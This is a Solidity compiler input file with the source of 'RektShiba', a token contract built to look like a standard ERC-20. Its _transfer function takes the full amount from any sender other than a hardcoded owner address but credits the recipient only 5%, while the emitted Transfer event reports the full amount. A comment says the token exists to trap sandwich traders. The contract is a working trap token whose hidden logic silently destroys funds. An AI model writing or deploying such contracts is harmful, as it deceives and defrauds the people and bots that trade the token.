{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"RektShiba.sol":{"content":"pragma solidity ^0.6.12;\r\n\r\n//Do not buy if you are a human. This token is just to rekt   s_a n:d.w i_c:h   t:r_a.d_e r.s\r\n\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// ----------------------------------------------------------------------------\r\n// Safe Math Library\r\n// ----------------------------------------------------------------------------\r\ncontract SafeMath {\r\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\r\n        c = a + b;\r\n        require(c >= a);\r\n    }\r\n    function safeSub(uint a, uint b) public pure returns (uint c) {\r\n        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\r\n        c = a / b;\r\n    }\r\n}\r\n\r\n\r\ncontract RektShiba is IERC20, SafeMath {\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\r\n\r\n    uint256 public _totalSupply;\r\n\r\n    mapping(address => uint) balances;\r\n    mapping(address => mapping(address => uint)) allowed;\r\n\r\n    address ownerC;\r\n\r\n    /**\r\n     * Constrctor function\r\n     *\r\n     * Initializes contract with initial supply tokens to the creator of the contract\r\n     */\r\n    constructor() public {\r\n        name = \"RektShiba\";\r\n        symbol = \"RSHIB\";\r\n        decimals = 18;\r\n        _totalSupply = 1000000000000000000000000000;\r\n\r\n        ownerC = 0x3f8D74AdF8661809abc018250B0CA4026F8cFeBF;\r\n\r\n        balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint) {\r\n        return _totalSupply  - balances[address(0)];\r\n    }\r\n\r\n    function balanceOf(address tokenOwner) public view override returns (uint balance) {\r\n        return balances[tokenOwner];\r\n    }\r\n\r\n    function allowance(address tokenOwner, address spender) public view override returns (uint remaining) {\r\n        return allowed[tokenOwner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint tokens) public override returns (bool success) {\r\n        allowed[msg.sender][spender] = tokens;\r\n        emit Approval(msg.sender, spender, tokens);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint tokens) public override returns (bool success) {\r\n        _transfer(msg.sender, to, tokens);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n      require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n      require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n      uint256 senderBalance = balances[sender];\r\n      require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n      \r\n      if (sender == ownerC) {\r\n        balances[sender] = senderBalance - amount;\r\n        balances[recipient] += amount;\r\n      } else {\r\n        balances[sender] = senderBalance - amount;\r\n        uint256 trapAmount = (amount * 5) / 100;\r\n        balances[recipient] += trapAmount;\r\n      }\r\n      \r\n      emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n\r\n    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {\r\n        balances[from] = safeSub(balances[from], tokens);\r\n        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\r\n        balances[to] = safeAdd(balances[to], tokens);\r\n        emit Transfer(from, to, tokens);\r\n        return true;\r\n    }\r\n}"}}}